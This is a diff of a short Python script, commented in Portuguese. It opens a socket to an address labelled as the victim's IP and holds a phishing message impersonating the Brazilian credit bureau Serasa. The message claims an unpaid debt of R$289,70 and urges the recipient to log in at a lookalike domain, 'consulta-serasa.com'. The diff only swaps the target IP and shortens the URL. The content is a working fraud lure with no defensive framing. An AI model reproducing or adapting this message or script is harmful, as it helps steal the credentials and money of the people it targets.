@@ -1,11 +1,11 @@
 import socket
 
-HOST = '198.51.100.129'  # IP da vítima
+HOST = '203.0.113.1'  # IP da vítima
 PORT = 1234
 
 mensagem = ("Prezado(a) cliente, identificamos uma pendência financeira em seu CPF no valor de R$289,70.\n\n"
             "Para evitar negativação do nome, acesse imediatamente o portal abaixo e realize a verificação dos dados:\n"
-            "consulta-serasa.com:8080/login\n\n"
+            "consulta-serasa.com:8080\n\n"
             "Após o login, você poderá gerar o boleto de quitação ou parcelar sua dívida.\n\n"
             "Atendimento automático 24h.")
 
